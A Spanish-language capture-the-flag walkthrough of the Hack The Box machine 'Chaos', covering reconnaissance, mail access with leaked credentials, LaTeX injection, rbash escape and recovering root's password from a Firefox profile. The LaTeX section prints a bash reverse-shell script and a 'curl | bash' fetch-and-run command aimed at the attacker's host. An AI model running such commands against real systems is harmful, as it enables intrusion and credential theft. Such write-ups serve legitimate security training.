# Chaos 

**Sistema Operativo**: Linux

**Dificultad**: Fácil

**Técnicas Vistas**: Password Guessing /
Abusing e-mail service (claws-mail) /
Crypto Challenge (Decrypt Secret Message - AES Encrypted) /
LaTeX Injection (RCE) /
Bypassing rbash (Restricted Bash) /
Extracting Credentials from Firefox Profile

Te prepara para las **Certificaciones**: eWPT eJPT<br><br>

![TERMINADA](https://github.com/user-attachments/assets/2dd45017-c02f-470e-a915-78214cbc7a83)<br><br>

# Recocimiento

Utilizando `nmap` encontramos puertos abiertos:

![1 - 2025-04-22_16-34](https://github.com/user-attachments/assets/f5cd757c-0629-4b14-8799-ab7da34ec9cc)<br><br>

- `-p-` -> Escanea todos los puertos 
- `-sS` -> escaneo de tipo SYN
- `--open` -> Todos los puertos abiertos
- `--min-rate=5000` -> Manda mínimo 5000 paquetes por segundo
- `-Pn` -> Asume que el host especificado está activo
- `-vvv` -> Aplica triple Verbose 
- `-n` -> Que no aplique resolución DNS
- `-oG allports` -> manda todo a un archivo con nombre de "allports"<br><br>

Encontramos este panel de autenticación en la ruta `https://10.10.10.120:10000`

![2 - 2025-04-22_18-53](https://github.com/user-attachments/assets/a69f56b4-0b5a-4cb8-b27b-7098ac07a1f5)<br><br>

Utilizando `gobuster` encontramos este directorio `wp`.

![3 - 2025-04-22_18-54](https://github.com/user-attachments/assets/6e92b507-f803-420a-a46f-3e5566bf1bad)<br><br>

Encontramos un subdirectorio `wordpress` donde vemos que el usuario `human` escribió un articulo el cual la contraseña es `human` también.
Nos da unas credenciales `ayush:jiujitsu`.<br><br>

![4 - 2025-04-22_18-55](https://github.com/user-attachments/assets/e4b8732d-09fd-4496-9b0e-5309bec87723)<br><br>

En `vim /etc/hosts` ponemos `10.10.10.120 wordpress.chaos.htb chaos.htb`.<br><br>

# Claws-mail (IMAP)

`apt install claws-mail`

Ponemos el usuario y el mail.

![5 - 2025-04-23_07-30](https://github.com/user-attachments/assets/523671ee-7597-4dc0-a2d6-d50e665265f5)<br><br>


Completamos:

![6 - 2025-04-23_07-31](https://github.com/user-attachments/assets/8034541f-36d9-4cd0-b7ef-a836b7007678)<br><br>


Apuntamos directamente al dominio:

![7 - 2025-04-23_07-32](https://github.com/user-attachments/assets/d6fdb3ff-a4dc-44a3-b978-f9b6667a9a30)<br><br>


Logramos ver un tal `sahay` donde nos comparte un `.txt` cifrado, y un `.py` que es el script que lo cifra.

![8 - 2025-04-23_07-34](https://github.com/user-attachments/assets/a69e15a2-fffe-4fea-aaee-5f43fe637418)<br><br>


Encontramos en github el script para desencriptar: `wget https://raw.githubusercontent.com/vj0shii/File-Encryption-Script/refs/heads/master/decrypt.py`.

- Nota:  Cambiar la varibale raw_input por input, seria: input("Enter filename: ") y input("Enter password: ").
- Nota: Hacer un `pip install pycryptodome`.<br><br>


Conseguimos un Link:

![9 - 2025-04-23_07-50](https://github.com/user-attachments/assets/8a7b17a7-3a34-49d4-b3ee-f078bcf09852)<br><br>

# Latex Injection

Encontramos un directorio `/pdf` donde se suben los documentos.

![10 - 2025-04-23_08-30](https://github.com/user-attachments/assets/b2defd0a-cde4-4ee5-b1c6-fbf2a6aa2134)<br><br>


Vemos que es vulnerable a `Latex Injection`

![11 - 2025-04-23_08-36](https://github.com/user-attachments/assets/8dfa752e-0546-4505-99e7-e8ee0ec0939a)<br><br>


Ganamos acceso:
`vim index.html` ->
```
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.43/443 0>&1
```

`python3 -m http.server 80` -> Comparto el `index.html`.
`nc -nlvp 443` -> Me pongo en escucha.

`curl 10.10.14.43 | bash` -> Ganamos acceso.

![12 - 2025-04-23_08-42](https://github.com/user-attachments/assets/9532f4d6-8819-4f05-8bc0-b494c76f1ef9)<br><br>

# Escalada de privilegios

`su ayush` ->  password: `jiujitsu`

Estamos en una `rbash` con doble `TAB` vemos que podemos ejecutar `tar`, si vamos a https://gtfobins.github.io/gtfobins/tar/ , vemos que podemos ejecutar un comando que nos da una  `sh` o una `bash`.

![13 - 2025-04-23_09-04](https://github.com/user-attachments/assets/7ff70244-98cd-41cb-af33-8982aca2e857)<br><br>


Luego extendemos el `PATH`. Asi: `export PATH=/root/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games`<br><br>


##### Mozilla

Vemos  un `.mozilla` entramos y hacemos `python3 -m http.server 8008`.

![15 - 2025-04-23_09-54](https://github.com/user-attachments/assets/d27d1ba7-a363-4e76-9abd-6f8e212e47a8)<br><br>


`wget -r http://chaos.htb:8008` ->  Nos descargamos todo en nuestra maquina de atacante.

`wget https://raw.githubusercontent.com/unode/firefox_decrypt/refs/heads/main/firefox_decrypt.py` -> Nos descargamos el script.

Nos da la contraseña de root:

![14 - 2025-04-23_09-45](https://github.com/user-attachments/assets/8b64c5b1-d75e-400b-b21b-4995b1935845)<br><br>

Flag:

![FLAG](https://github.com/user-attachments/assets/950f76af-2766-43b7-a4ea-27ce2b9ab2a0)


